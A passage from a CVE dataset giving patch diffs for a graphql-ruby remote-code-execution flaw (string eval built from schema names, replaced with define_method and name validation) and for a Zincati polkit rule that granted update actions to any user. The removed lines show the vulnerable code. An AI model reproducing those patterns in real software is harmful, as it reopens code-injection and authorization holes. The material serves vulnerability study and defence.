MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accepts strings and may result evaluating unexpected code. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/analysis/analyzer.rb:\n```\n@@ -42,6 +42,7 @@\ndef result\n         raise GraphQL::RequiredImplementationMissingError\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n       class << self\n         private\n\n@@ -72,7 +73,7 @@\ndef on_leave_#{member_name}(node, parent, visitor)\n       build_visitor_hooks :variable_definition\n       build_visitor_hooks :variable_identifier\n       build_visitor_hooks :abstract_node\n-\n+      # rubocop:enable Development/NoEvalCop\n       protected\n \n       # @return [GraphQL::Query, GraphQL::Execution::Multiplex] Whatever this analyzer is analyzing\n```\n\nFilename: lib/graphql/analysis/visitor.rb:\n```\n@@ -64,6 +64,7 @@\ndef response_path\n         @response_path.dup\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n       # Visitor Hooks\n       [\n         :operation_definition, :fragment_definition,\n\n@@ -92,6 +93,7 @@\ndef call_on_leave_#{node_type}(node, parent)\n \n         RUBY\n       end\n+      # rubocop:enable Development/NoEvalCop\n \n       def on_operation_definition(node, parent)\n         object_type = @schema.root_type_for_operation(node.operation_type)\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -141,6 +141,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -343,6 +345,7 @@\ndef marshal_load(values)\n               RUBY\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/language/static_visitor.rb:\n```\n@@ -22,39 +22,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [void]\n-          def #{node_method}(node, parent)\n-            #{\n-              if method_defined?(child_visit_method)\n-                \"#{child_visit_method}(node)\"\n-              elsif children_of_type\n-                children_of_type.map do |child_accessor, child_class|\n-                  \"node.#{child_accessor}.each do |child_node|\n-                    #{child_class.visit_method}(child_node, node)\n-                  end\"\n-                end.join(\"\\n\")\n-              else\n-                \"\"\n-              end\n-            }\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         document_node.children.each do |child_node|\n           visit_method = child_node.visit_method\n\n@@ -123,6 +90,41 @@\ndef on_argument_children(new_node)\n         end\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      # We don't use `alias` here because it breaks `super`\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [void]\n+          def #{node_method}(node, parent)\n+            #{\n+              if method_defined?(child_visit_method)\n+                \"#{child_visit_method}(node)\"\n+              elsif children_of_type\n+                children_of_type.map do |child_accessor, child_class|\n+                  \"node.#{child_accessor}.each do |child_node|\n+                    #{child_class.visit_method}(child_node, node)\n+                  end\"\n+                end.join(\"\\n\")\n+              else\n+                \"\"\n+              end\n+            }\n+          end\n+        RUBY\n+      end\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -162,6 +164,8 @@\ndef on_argument_children(new_node)\n       ].each do |ast_node_class|\n         make_visit_methods(ast_node_class)\n       end\n+\n+      # rubocop:disable Development/NoEvalCop\n     end\n   end\n end\n```\n\nFilename: lib/graphql/language/visitor.rb:\n```\n@@ -61,61 +61,6 @@\ndef visit\n         end\n       end\n \n-      # We don't use `alias` here because it breaks `super`\n-      def self.make_visit_methods(ast_node_class)\n-        node_method = ast_node_class.visit_method\n-        children_of_type = ast_node_class.children_of_type\n-        child_visit_method = :\"#{node_method}_children\"\n-\n-        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n-          # The default implementation for visiting an AST node.\n-          # It doesn't _do_ anything, but it continues to visiting the node's children.\n-          # To customize this hook, override one of its make_visit_methods (or the base method?)\n-          # in your subclasses.\n-          #\n-          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n-          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n-          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n-          def #{node_method}(node, parent)\n-            if node.equal?(DELETE_NODE)\n-              # This might be passed to `super(DELETE_NODE, ...)`\n-              # by a user hook, don't want to keep visiting in that case.\n-              [node, parent]\n-            else\n-              new_node = node\n-              #{\n-                if method_defined?(child_visit_method)\n-                  \"new_node = #{child_visit_method}(new_node)\"\n-                elsif children_of_type\n-                  children_of_type.map do |child_accessor, child_class|\n-                    \"node.#{child_accessor}.each do |child_node|\n-                      new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n-                      # Reassign `node` in case the child hook makes a modification\n-                      if new_child_and_node.is_a?(Array)\n-                        new_node = new_child_and_node[1]\n-                      end\n-                    end\"\n-                  end.join(\"\\n\")\n-                else\n-                  \"\"\n-                end\n-              }\n-\n-              if new_node.equal?(node)\n-                [node, parent]\n-              else\n-                [new_node, parent]\n-              end\n-            end\n-          end\n-\n-          def #{node_method}_with_modifications(node, parent)\n-            new_node_and_new_parent = #{node_method}(node, parent)\n-            apply_modifications(node, parent, new_node_and_new_parent)\n-          end\n-        RUBY\n-      end\n-\n       def on_document_children(document_node)\n         new_node = document_node\n         document_node.children.each do |child_node|\n\n@@ -216,6 +161,63 @@\ndef on_argument_children(new_node)\n         new_node\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n+      # We don't use `alias` here because it breaks `super`\n+      def self.make_visit_methods(ast_node_class)\n+        node_method = ast_node_class.visit_method\n+        children_of_type = ast_node_class.children_of_type\n+        child_visit_method = :\"#{node_method}_children\"\n+\n+        class_eval(<<-RUBY, __FILE__, __LINE__ + 1)\n+          # The default implementation for visiting an AST node.\n+          # It doesn't _do_ anything, but it continues to visiting the node's children.\n+          # To customize this hook, override one of its make_visit_methods (or the base method?)\n+          # in your subclasses.\n+          #\n+          # @param node [GraphQL::Language::Nodes::AbstractNode] the node being visited\n+          # @param parent [GraphQL::Language::Nodes::AbstractNode, nil] the previously-visited node, or `nil` if this is the root node.\n+          # @return [Array, nil] If there were modifications, it returns an array of new nodes, otherwise, it returns `nil`.\n+          def #{node_method}(node, parent)\n+            if node.equal?(DELETE_NODE)\n+              # This might be passed to `super(DELETE_NODE, ...)`\n+              # by a user hook, don't want to keep visiting in that case.\n+              [node, parent]\n+            else\n+              new_node = node\n+              #{\n+                if method_defined?(child_visit_method)\n+                  \"new_node = #{child_visit_method}(new_node)\"\n+                elsif children_of_type\n+                  children_of_type.map do |child_accessor, child_class|\n+                    \"node.#{child_accessor}.each do |child_node|\n+                      new_child_and_node = #{child_class.visit_method}_with_modifications(child_node, new_node)\n+                      # Reassign `node` in case the child hook makes a modification\n+                      if new_child_and_node.is_a?(Array)\n+                        new_node = new_child_and_node[1]\n+                      end\n+                    end\"\n+                  end.join(\"\\n\")\n+                else\n+                  \"\"\n+                end\n+              }\n+\n+              if new_node.equal?(node)\n+                [node, parent]\n+              else\n+                [new_node, parent]\n+              end\n+            end\n+          end\n+\n+          def #{node_method}_with_modifications(node, parent)\n+            new_node_and_new_parent = #{node_method}(node, parent)\n+            apply_modifications(node, parent, new_node_and_new_parent)\n+          end\n+        RUBY\n+      end\n+\n       [\n         Language::Nodes::Argument,\n         Language::Nodes::Directive,\n\n@@ -256,6 +258,8 @@\ndef on_argument_children(new_node)\n         make_visit_methods(ast_node_class)\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       private\n \n       def apply_modifications(node, parent, new_node_and_new_parent)\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -53,6 +53,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type: nil, name: nil, loads: nil, description: nil, comment: nil, ast_node: nil, default_value: NOT_CONFIGURED, as: nil, from_resolver: false, camelize: true, prepare: nil, owner:, validates: nil, directives: nil, deprecation_reason: nil, replace_null_with_default: false, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @comment = comment\n\n@@ -89,11 +90,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required: true, type\n         end\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -467,17 +467,18 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval <<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def build_resolve_type(lookup_hash, directives, missing_type_handler)\n           resolve_type_proc = nil\n           resolve_type_proc = ->(ast_node) {\n```\n\nFilename: lib/graphql/schema/directive.rb:\n```\n@@ -99,7 +99,7 @@\ndef repeatable(new_value)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @default_graphql_name ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -48,7 +48,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, directives: nil,\n         end\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -255,7 +255,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: nil, description: NOT_CON\n \n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n-\n+        NameValidator.validate!(@name)\n         @description = description\n         @comment = comment\n         @type = @owner_type = @own_validators = @own_directives = @own_arguments = @arguments_statically_coercible = nil # these will be prepared later if necessary\n\n@@ -369,7 +369,7 @@\ndef ensure_loaded\n           if @definition_block.arity == 1\n             @definition_block.call(self)\n           else\n-            instance_eval(&@definition_block)\n+            instance_exec(self, &@definition_block)\n           end\n           self.extensions.each(&:after_define_apply)\n           @call_after_define = true\n```\n\nFilename: lib/graphql/schema/input_object.rb:\n```\n@@ -132,14 +132,8 @@\ndef argument(*args, **kwargs, &block)\n             end\n           end\n           # Add a method access\n-          method_name = argument_defn.keyword\n           suppress_redefinition_warning do\n-            class_eval <<-RUBY, __FILE__, __LINE__\n-              def #{method_name}\n-                self[#{method_name.inspect}]\n-              end\n-              alias_method :#{method_name}, :#{method_name}\n-            RUBY\n+            define_accessor_method(argument_defn.keyword)\n           end\n           argument_defn\n         end\n\n@@ -256,6 +250,11 @@\ndef suppress_redefinition_warning\n         ensure\n           $VERBOSE = verbose\n         end\n+\n+        def define_accessor_method(method_name)\n+          define_method(method_name) { self[method_name] }\n+          alias_method(method_name, method_name)\n+        end\n       end\n \n       private\n```\n\nFilename: lib/graphql/schema/interface.rb:\n```\n@@ -29,7 +29,7 @@\ndef definition_methods(&block)\n             const_set(:DefinitionMethods, defn_methods_module)\n             extend(self::DefinitionMethods)\n           end\n-          self::DefinitionMethods.module_eval(&block)\n+          self::DefinitionMethods.module_exec(&block)\n         end\n \n         # @see {Schema::Warden} hides interfaces without visible implementations\n```\n\nFilename: lib/graphql/schema/member/has_directives.rb:\n```\n@@ -6,7 +6,7 @@\nclass Member\n       module HasDirectives\n         def self.extended(child_cls)\n           super\n-          child_cls.module_eval { self.own_directives = nil }\n+          child_cls.module_exec { self.own_directives = nil }\n         end\n \n         def inherited(child_cls)\n```\n\nFilename: lib/graphql/schema/member/has_fields.rb:\n```\n@@ -185,7 +185,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_fields ||= nil\n             @field_class ||= nil\n           end\n```\n\nFilename: lib/graphql/schema/member/has_interfaces.rb:\n```\n@@ -133,7 +133,7 @@\ndef self.extended(child_class)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @own_interface_type_memberships ||= nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/scoped.rb:\n```\n@@ -30,7 +30,7 @@\ndef reauthorize_scoped_objects(new_value = nil)\n \n         def inherited(subclass)\n           super\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @reauthorize_scoped_objects = nil\n           end\n         end\n```\n\nFilename: lib/graphql/schema/member/type_system_helpers.rb:\n```\n@@ -42,7 +42,7 @@\ndef kind\n         private\n \n         def inherited(subclass)\n-          subclass.class_eval do\n+          subclass.class_exec do\n             @to_non_null_type ||= nil\n             @to_list_type ||= nil\n           end\n```\n\nFilename: lib/graphql/tracing/appoptics_trace.rb:\n```\n@@ -28,6 +28,8 @@\ndef self.version\n         Gem::Version.new('1.0.0')\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       [\n         'lex',\n         'parse',\n\n@@ -55,6 +57,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field(query:, field:, ast_node:, arguments:, object:)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/appsignal_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(set_action_name: false, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -43,6 +45,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key)\n         Appsignal.instrument(platform_key) do\n           yield\n```\n\nFilename: lib/graphql/tracing/data_dog_trace.rb:\n```\n@@ -20,6 +20,8 @@\ndef initialize(tracer: nil, analytics_enabled: false, analytics_sample_rate: 1.0\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => 'lex.graphql',\n         'parse' => 'parse.graphql',\n\n@@ -69,6 +71,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def execute_field_span(span_key, query, field, ast_node, arguments, object)\n         return_type = field.type.unwrap\n         trace_field = if return_type.kind.scalar? || return_type.kind.enum?\n```\n\nFilename: lib/graphql/tracing/notifications_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(engine:, **rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -39,6 +41,8 @@\ndef #{trace_method}(**metadata, &block)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       include PlatformTrace\n     end\n   end\n```\n\nFilename: lib/graphql/tracing/platform_trace.rb:\n```\n@@ -39,6 +39,9 @@\ndef self.included(child_class)\n           include(BaseKeyCache)\n         }\n         child_class.const_set(:KeyCache, key_methods_class)\n+\n+        # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n         [:execute_field, :execute_field_lazy].each do |field_trace_method|\n           if !child_class.method_defined?(field_trace_method)\n             child_class.module_eval <<-RUBY, __FILE__, __LINE__\n\n@@ -91,6 +94,8 @@\ndef #{rt_trace_method}(query:, type:, object:)\n               end\n             RUBY\n           end\n+\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/tracing/prometheus_trace.rb:\n```\n@@ -13,6 +13,8 @@\ndef initialize(client: PrometheusExporter::Client.default, keys_whitelist: [\"exe\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         instrument_prometheus_execution(platform_key, \"execute_field\", &block)\n       end\n```\n\nFilename: lib/graphql/tracing/scout_trace.rb:\n```\n@@ -16,6 +16,8 @@\ndef initialize(set_transaction_name: false, **_rest)\n         super\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"lex.graphql\",\n         \"parse\" => \"parse.graphql\",\n\n@@ -45,6 +47,7 @@\ndef #{trace_method}(**data)\n         end\n         RUBY\n       end\n+      # rubocop:enable Development/NoEvalCop\n \n       def platform_execute_field(platform_key, &block)\n         self.class.instrument(\"GraphQL\", platform_key, INSTRUMENT_OPTS, &block)\n```\n\nFilename: lib/graphql/tracing/sentry_trace.rb:\n```\n@@ -23,6 +23,8 @@\ndef execute_query(**data)\n         instrument_sentry_execution(\"graphql.execute\", \"execute_query\", data) { super }\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         \"lex\" => \"graphql.lex\",\n         \"parse\" => \"graphql.parse\",\n\n@@ -39,6 +41,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         instrument_sentry_execution(platform_key, \"execute_field\", &block)\n       end\n```\n\nFilename: lib/graphql/tracing/statsd_trace.rb:\n```\n@@ -11,6 +11,8 @@\ndef initialize(statsd:, **rest)\n         super(**rest)\n       end\n \n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n       {\n         'lex' => \"graphql.lex\",\n         'parse' => \"graphql.parse\",\n\n@@ -30,6 +32,8 @@\ndef #{trace_method}(**data)\n         RUBY\n       end\n \n+      # rubocop:enable Development/NoEvalCop\n+\n       def platform_execute_field(platform_key, &block)\n         @statsd.time(platform_key, &block)\n       end\n```\n\nFilename: lib/graphql/types/relay/connection_behaviors.rb:\n```\n@@ -13,7 +13,7 @@\ndef self.included(child_class)\n           child_class.node_nullable(true)\n           child_class.edges_nullable(true)\n           child_class.edge_nullable(true)\n-          child_class.module_eval {\n+          child_class.module_exec {\n             self.edge_type = nil\n             self.node_type = nil\n             self.edge_class = nil\n```\n\nFilename: lib/graphql/types/relay/edge_behaviors.rb:\n```\n@@ -8,7 +8,7 @@\ndef self.included(child_class)\n           child_class.description(\"An edge in a connection.\")\n           child_class.field(:cursor, String, null: false, description: \"A cursor for use in pagination.\")\n           child_class.extend(ClassMethods)\n-          child_class.class_eval { self.node_type = nil }\n+          child_class.class_exec { self.node_type = nil }\n           child_class.node_nullable(true)\n           child_class.default_broadcastable(nil)\n         end\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"2.3.20\"\n+  VERSION = \"2.3.21\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -405,4 +405,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/e3b33ace05391da2871c75ab4d3b66e29133b367"
            }
        ],
        "published_date": "2025-03-12T18:15:57.957Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nrmosolgo\n/\ngraphql-ruby\nPublic\nNotifications You must be signed in to change notification settings\nFork 1.4k\nStar 5.4k\nCode\nIssues\n44\nPull requests\n11\nDiscussions\nActions\nWiki\nSecurity\n1\nInsights\nAdditional navigation options\nRemote code execution when loading a crafted GraphQL schema\nCritical rmosolgo published GHSA-q92j-grw3-h492 on Mar 12Mar 12, 2025\nPackage\nbundler graphql\n(\nRubyGems\n)\nAffected versions\n>= 2.4.0, < 2.4.13\n>= 2.3.0, < 2.3.21\n>= 2.2.0, < 2.2.17\n>= 2.1.0, < 2.1.15\n>= 2.0.0, < 2.0.32\n>= 1.13.0, < 1.13.24\n>= 1.12.0, < 1.12.25\n>= 1.11.5, < 1.11.11\nPatched versions\n2.4.13\n2.3.21\n2.2.17\n2.1.15\n2.0.32\n1.13.24\n1.12.25\n1.11.11\nDescription\nSummary\nLoading a malicious schema definition in GraphQL::Schema.from_introspection (or GraphQL::Schema::Loader.load) can result in remote code execution. Any system which loads a schema by JSON from an untrusted source is vulnerable, including those that use GraphQL::Client to load external schemas via GraphQL introspection.\nSeverity\nCritical\n9.1\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H\nCVE ID\nCVE-2025-27407\nWeaknesses\nCWE-94\nCredits\nyvvdwf\nReporter\nrmosolgo\nRemediation developer\njoernchen\nRemediation reviewer\nadarshan-gl\nRemediation reviewer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not provide explicit steps to exploit the vulnerability or a proof of concept showing the exploitation methodology.",
                "url": "https://github.com/rmosolgo/graphql-ruby/security/advisories/GHSA-q92j-grw3-h492"
            }
        ],
        "sw_version": "v1.11.5",
        "sw_version_wget": "https://github.com/rmosolgo/graphql-ruby/archive/refs/tags/v1.11.5.zip"
    },
    "CVE-2025-27512": {
        "cwe": [
            {
                "id": "CWE-783",
                "value": "CWE-783: Operator Precedence Logic Error"
            },
            {
                "id": "CWE-863",
                "value": "CWE-863: Incorrect Authorization"
            }
        ],
        "description": "Zincati is an auto-update agent for Fedora CoreOS hosts. Zincati ships a polkit rule which allows the `zincati` system user to use the actions `org.projectatomic.rpmostree1.deploy` to deploy updates to the system and `org.projectatomic.rpmostree1.finalize-deployment` to reboot the system into the deployed update. Since Zincati v0.0.24, this polkit rule contains a logic error which broadens access of those polkit actions to any unprivileged user rather than just the `zincati` system user. In practice, this means that any unprivileged user with access to the system D-Bus socket is able to deploy older Fedora CoreOS versions (which may have other known vulnerabilities). Note that rpm-ostree enforces that the selected version must be from the same branch the system is currently on so this cannot directly be used to deploy an attacker-controlled update payload. This primarily impacts users running untrusted workloads with access to the system D-Bus socket. Note that in general, untrusted workloads should not be given this access, whether containerized or not. By default, containers do not have access to the system D-Bus socket. The logic error is fixed in Zincati v0.0.30. A workaround is to manually add a following polkit rule, instructions for which are available in the GitHub Security Advisory.",
        "languages": [
            "Rust"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\ndist/polkit-1/rules.d: fix boolean logic\n\nFilename: dist/polkit-1/rules.d/zincati.rules:\n```\n@@ -1,11 +1,12 @@\n// Allow Zincati to deploy, finalize, and cleanup a staged deployment through rpm-ostree.\n polkit.addRule(function(action, subject) {\n-    if ((action.id == \"org.projectatomic.rpmostree1.deploy\" ||\n-         action.id == \"org.projectatomic.rpmostree1.finalize-deployment\") ||\n-         action.id == \"org.projectatomic.rpmostree1.cleanup\" ||\n-         action.id == \"org.projectatomic.rpmostree1.rebase\" &&\n-        subject.user == \"zincati\") {\n-        return polkit.Result.YES;\n+    if (action.id == \"org.projectatomic.rpmostree1.deploy\" ||\n+        action.id == \"org.projectatomic.rpmostree1.rebase\" ||\n+        action.id == \"org.projectatomic.rpmostree1.finalize-deployment\" ||\n+        action.id == \"org.projectatomic.rpmostree1.cleanup\") {\n+        if (subject.user == \"zincati\") {\n+            return polkit.Result.YES;\n+        }\n     }\n });\n```",
